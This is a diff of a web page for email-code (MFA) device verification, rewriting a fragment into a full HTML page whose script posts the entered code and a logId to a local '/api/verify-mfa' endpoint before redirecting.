@@ -1,23 +1,46 @@
-<div class="login-card">
-    <h2>🛡️ Verify Device</h2>
-    <p class="subtitle">Enter the 6-digit code sent to your email.</p>
-    <div id="status-box" class="status-box"></div>
-    <input type="text" id="mfa-input" placeholder="000000" maxlength="6">
-    <button onclick="verifyMFA()">Verify & Login</button>
-</div>
-<script src="script.js"></script>
-<script>
-async function verifyMFA() {
-    const code = document.getElementById('mfa-input').value;
-    const logId = new URLSearchParams(window.location.search).get('logId');
-    if (!code || !logId) return;
-    
-    const res = await fetch('/api/verify-mfa', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ logId, code })
-    });
-    if (res.ok) { window.location.href = 'welcome.html'; } 
-    else { updateStatus('danger', "Invalid Code!"); }
-}
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Verification Required</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login-card">
+        <div style="font-size: 3rem; margin-bottom: 1rem; text-align: center;">🛡️</div>
+        <h2>Verify Identity</h2>
+        <p class="subtitle">We've sent a 6-digit code to your email. Please enter it below.</p>
+        
+        <div id="status-box" class="status-box"></div>
+
+        <input type="text" id="mfa-input" placeholder="000 000" maxlength="6" style="text-align: center; font-size: 1.5rem; letter-spacing: 0.5rem;">
+        
+        <button onclick="verifyMFA()">Verify & Continue</button>
+        
+        <div class="footer">
+            Didn't get the code? <a href="#" onclick="location.reload()">Resend</a>
+        </div>
+    </div>
+    <script src="script.js"></script>
+    <script>
+        // Inline script สำหรับหน้า MFA โดยเฉพาะ
+        async function verifyMFA() {
+            const code = document.getElementById('mfa-input').value;
+            const logId = new URLSearchParams(window.location.search).get('logId');
+            if (!code || !logId) return;
+            
+            const res = await fetch('/api/verify-mfa', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ logId, code })
+            });
+            if (res.ok) { 
+                updateStatus('success', 'Verified! Redirecting...');
+                setTimeout(() => window.location.href = 'welcome.html', 800);
+            } else { 
+                updateStatus('danger', "Invalid or expired code"); 
+            }
+        }
+    </script>
+</body>
+</html>
